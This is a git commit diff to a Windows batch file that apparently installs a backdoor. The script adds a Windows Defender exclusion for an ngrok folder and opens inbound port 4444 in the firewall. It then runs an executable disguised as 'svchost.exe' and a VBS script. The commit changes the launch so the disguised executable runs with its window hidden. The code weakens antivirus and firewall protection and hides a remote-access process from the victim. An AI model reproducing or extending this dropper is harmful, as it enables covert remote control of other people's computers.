018c09f2d8162bb8ca8635714e17c174da327302
ofutpemata22 <gagi.cu.ci@gmail.com>
2025-04-17 13:07:29 +0300

    a

--- 1.bat
+++ 1.bat
@@ -3,6 +3,7 @@ for /f "tokens=*" %%a in ('echo %USERNAME%') do set USERNAME=%%a
 set "NGROK_PATH=C:\Users\%USERNAME%\AppData\Local\ngrok"
 powershell -Command "$ngrokPath = '%NGROK_PATH%'; Add-MpPreference -ExclusionPath $ngrokPath" >nul 2>&1
 powershell -Command "New-NetFirewallRule -DisplayName 'FlaskApp' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4444 -Profile Any -EdgeTraversalPolicy Allow" >nul 2>&1
-start /min "" "%NGROK_PATH%\svchost.exe"
+
+powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%NGROK_PATH%\svchost.exe' -WindowStyle Hidden"
 start "" "%NGROK_PATH%\hst.vbs"
 exit
